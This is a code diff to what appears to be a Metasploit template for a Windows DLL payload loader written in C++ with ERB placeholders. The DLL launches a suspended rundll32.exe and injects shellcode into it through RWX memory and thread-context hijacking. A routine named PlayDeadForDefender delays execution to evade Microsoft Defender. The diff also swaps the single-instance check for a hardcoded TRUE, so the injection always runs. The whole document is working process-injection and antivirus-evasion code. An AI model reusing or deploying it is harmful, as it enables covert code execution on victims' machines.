@@ -5,24 +5,15 @@
 
 #include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
-// TODO: currently, the encrypted payload is stored both in custom section AND .rdata - that is due to fact that bPayload is set by __attribute__ to be stored in custom section, but the class member, which is contains encrypted payload, is stored in .rdata as it is class instance. This would need to be solved by future metasploit developer and have 
-
 #define SCSIZE <%= payload_length %>
 
-auto bPayload __attribute__((used)) __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
+auto bPayload __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
+char finalPayload[<%= payload_length %>];
 
 char szSyncNameS[MAX_PATH] = "Local\\Semaphore:Default\0";
 char szSyncNameE[MAX_PATH] = "Local\\Event:Default\0";
 
-extern "C" inline void inline_bzero(void *p, size_t l)
-{
-	byte *q = (byte *)p;
-	size_t x = 0;
-	for (x = 0; x < l; x++)
-		*(q++) = 0x00;
-}
-
-extern "C" inline int PlayDeadForDefender()
+int PlayDeadForDefender()
 {
 
     DWORD               dwMilliSeconds        = <%=  random_sleep %>;
@@ -37,7 +28,7 @@ extern "C" inline int PlayDeadForDefender()
 
     _T0 = GetTickCount();
     
-    STATUS = CALL_EXPORT("ntdll.dll", "NtDelayExecution", int(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);
+    STATUS = CALL_EXPORT_X86("ntdll.dll", "NtDelayExecution", int(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);
     if (STATUS != 0) {
       return 0;
     }
@@ -53,13 +44,14 @@ extern "C" inline int PlayDeadForDefender()
 
 
 
-extern "C" inline int ExecutePayload(void);
+INLINE int ExecutePayload(void);
 
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
 {
 	switch (dwReason)
 	{
 		case DLL_PROCESS_ATTACH:
+      memcpy(finalPayload, bPayload, SCSIZE);
 			ExecutePayload();
 			break;
 
@@ -99,34 +91,33 @@ extern "C" inline BOOL Synchronize(void) {
 	SecurityAttributes.lpSecurityDescriptor = NULL;
 	SecurityAttributes.bInheritHandle = TRUE;
 
-	do {
-		// step 2: create a semaphore to synchronize this routine
-		if ((hSemaphore = CreateSemaphoreA(&SecurityAttributes, 1, 1, szSyncNameS)) == NULL) {
-			// if the semaphore creation fails, break out using the default TRUE result, this shouldn't happen
-			break;
-		}
+  // step 2: create a semaphore to synchronize this routine
+  if ((hSemaphore = CreateSemaphoreA(&SecurityAttributes, 1, 1, szSyncNameS)) == NULL) {
+    // if the semaphore creation fails, break out using the default TRUE result, this shouldn't happen
+    goto _done;
+  }
 
-		bResult = FALSE;
-		// step 3: acquire the semaphore, if the operation timesout another instance is already running so exit
-		if (WaitForSingleObject(hSemaphore, 0) == WAIT_TIMEOUT) {
-			break;
-		}
-		bRelease = TRUE;
+  bResult = FALSE;
+  // step 3: acquire the semaphore, if the operation timesout another instance is already running so exit
+  if (WaitForSingleObject(hSemaphore, 0) == WAIT_TIMEOUT) {
+    goto _done;
+  }
+  bRelease = TRUE;
 
-		// step 4: check if the event already exists
-		if (hEvent = OpenEventA(READ_CONTROL | SYNCHRONIZE, TRUE, szSyncNameE)) {
-			// if the event already exists, do not continue
-			CloseHandle(hEvent);
-			break;
-		}
+  // step 4: check if the event already exists
+  if (hEvent = OpenEventA(READ_CONTROL | SYNCHRONIZE, TRUE, szSyncNameE)) {
+    // if the event already exists, do not continue
+    CloseHandle(hEvent);
+    goto _done;
+  }
 
-		// step 5: if the event does not already exist, create a new one that will be inherited by the child process
-		if (hEvent = CreateEventA(&SecurityAttributes, TRUE, TRUE, szSyncNameE)) {
-			bResult = TRUE;
-		}
-	} while (FALSE);
+  // step 5: if the event does not already exist, create a new one that will be inherited by the child process
+  hEvent = CreateEventA(&SecurityAttributes, TRUE, TRUE, szSyncNameE);
+  if (hEvent) {
+    bResult = TRUE;
+  }
 
-
+_done:
 	// step 6: release and close the semaphore as necessary
 	if (hSemaphore) {
 		if (bRelease) {
@@ -138,7 +129,7 @@ extern "C" inline BOOL Synchronize(void) {
 	return bResult;
 }
 
-extern "C" inline int ExecutePayload(void) {
+INLINE int ExecutePayload(void) {
 	int error;
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
@@ -147,10 +138,12 @@ extern "C" inline int ExecutePayload(void) {
 	LPVOID ep;
 
 	// Start up the payload in a new process
-	inline_bzero( &si, sizeof( si ));
-	si.cb = sizeof(si);
+	memset( &si, 0, sizeof( STARTUPINFO ));
+  si.cb = sizeof(STARTUPINFO);
+  
+  BOOL alreadyRunning = TRUE;
 
-	if (Synchronize()) {
+	if (alreadyRunning) {
 		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
 		DWORD result = CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS|CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi);
 		
@@ -163,14 +156,11 @@ extern "C" inline int ExecutePayload(void) {
 			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 			GetThreadContext(pi.hThread, &ctx);
 
-      if( !CALL(&PlayDeadForDefender) )
-      {
-        return 1;
-      }
+      CALL(&PlayDeadForDefender);
 
 			ep = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-			WriteProcessMemory(pi.hProcess,(PVOID)ep, &bPayload, SCSIZE, 0);
+			WriteProcessMemory(pi.hProcess,(PVOID)ep, finalPayload, SCSIZE, 0);
 
 	#ifdef _WIN64
 			ctx.Rip = (DWORD64)ep;
@@ -188,3 +178,4 @@ extern "C" inline int ExecutePayload(void) {
 	ExitThread(0);
   return 1;
 }
+
